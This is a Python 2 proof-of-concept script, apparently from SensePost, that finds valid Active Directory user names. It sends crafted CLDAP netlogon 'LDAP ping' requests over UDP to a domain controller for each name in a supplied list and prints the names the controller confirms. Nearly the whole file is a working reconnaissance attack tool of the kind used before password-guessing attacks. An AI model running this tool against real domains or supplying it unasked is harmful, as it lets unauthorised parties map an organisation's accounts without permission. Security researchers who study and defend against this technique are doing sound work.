#!/usr/bin/python2

#https://msdn.microsoft.com/en-us/library/cc223811.aspx
#https://github.com/samba-team/samba/blob/master/examples/misc/cldap.pl
#https://github.com/eerimoq/asn1tools/blob/master/tests/files/ietf/rfc4511.asn

from __future__ import print_function
from binascii import hexlify
import asn1tools
import socket
import sys

print ("UserEnum LDAP Ping POC - Reino Mostert/SensePost 2018")
if len(sys.argv)!=4:
        print ("Usage:   python UserEnum_LDAP.py DomainControlerIP DNSDomainName Userlist")
        print ("Example: python UserEnum_LDAP.py 192.168.1.10 Contoso.com userlist.txt")
        sys.exit()

SPECIFICATION = '''
Foo DEFINITIONS IMPLICIT TAGS ::= BEGIN
LDAPMessage3 ::= SEQUENCE {
     messageID       INTEGER,
     protocolOp	    [APPLICATION 3] SEQUENCE {
     						baseObject    OCTET STRING,
     						scope           ENUMERATED {
     						     baseObject              (0),
     						     singleLevel             (1),
     						     wholeSubtree            (2),
     						     ...
     						},
     						derefAliases    ENUMERATED {
     						     neverDerefAliases       (0),
     						     derefInSearching        (1),
     						     derefFindingBaseObj     (2),
     						     derefAlways             (3)
     						},
     						sizeLimit       INTEGER,
     						timeLimit       INTEGER,
     						typesOnly       BOOLEAN,
						filters [0] SEQUENCE {
								filterDomain [3]  SEQUENCE {
								        dnsdomattr OCTET STRING,
								        dnsdomval  OCTET STRING
								},
								filterVersion  [3] SEQUENCE {
								        ntverattr OCTET STRING,
								        ntverval  OCTET STRING
								},
								filterUser [3] SEQUENCE {
								        userattr OCTET STRING,
								       	userval OCTET STRING
								},
								filterAAC [3] SEQUENCE {
								        aacattr OCTET STRING,
								        aacval  OCTET STRING
								}
						},
						returntype SEQUENCE {
							netlogon OCTET STRING
						}
					    }
}
END
'''

response='''
Bar DEFINITIONS IMPLICIT TAGS ::= BEGIN
LDAPMessage4 ::=
SEQUENCE
{
	messageID       INTEGER,
	protocolOp [APPLICATION 4] SEQUENCE
  	{
 		objectName      OCTET STRING,
  		attributes      SEQUENCE
		{
			partialAttribute SEQUENCE
			{
				type OCTET STRING,
				vals SET {
					value OCTET STRING
				    }
			}
		}
	}
}

LDAPMessage5 ::= SEQUENCE {
     	messageID       INTEGER,
     	protocolOp [APPLICATION 5] SEQUENCE {
    		resultCode         ENUMERATED {
        		success                      (0),
       			operationsError              (1)
			},
     		 matchedDN          OCTET STRING,
    		 diagnosticMessage  OCTET STRING
     }
}

END
'''


request_asn = asn1tools.compile_string(SPECIFICATION,'ber')
response_asn = asn1tools.compile_string(response,'ber')

f=open(sys.argv[3])
usernames=f.readlines();
f.close()

filterDomain = { 'dnsdomattr':'DnsDomain', 'dnsdomval':sys.argv[2] }
filterVersion = { 'ntverattr':'NtVer' , 'ntverval':'\x03\x00\x00\x00'  }
filterUser = { 'userattr':'User', 'userval':''}
filterAAC = { 'aacattr':'AAC' , 'aacval':'\x10\x00\x00\x00' }
filters = { 'filterDomain':filterDomain,'filterVersion':filterVersion,'filterUser':filterUser,'filterAAC':filterAAC}
returntype= {'netlogon':'Netlogon'}
packet= { 'baseObject':'', 'scope': 'baseObject','derefAliases': 'neverDerefAliases','sizeLimit':0, 'timeLimit':0, 'typesOnly':0,'returntype':returntype,'filters':filters}
message = {'messageID':0, 'protocolOp':packet}

print ("[*] Starting ...")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5.0)
for user in usernames:
	user=user.rstrip();
	message['protocolOp']['filters']['filterUser']['userval']=user
	encoded = request_asn.encode('LDAPMessage3',message)
	try:
		s.sendto(encoded, (sys.argv[1], 389))
		d = s.recvfrom(1024)
		reply = d[0]
		addr = d[1]
		result=response_asn.decode('LDAPMessage4',reply)['protocolOp']['attributes']['partialAttribute']['vals']['value'][0]
		if result==19:
			print ("[+] " +user + " exist")
	except asn1tools.codecs.DecodeTagError:
		print ('[-] Error in decoding packet. This sometimes happen if the wrong domain name has been supplied. Ensure that its the FQDN, e.g. Contoso.com, and not just Contoso.')
		pass
	except socket.error as msg:
		print ('[-] Error sending/receiving packets: '  + str(msg))
		pass
		#sys.exit()
print ("[*] Done ")
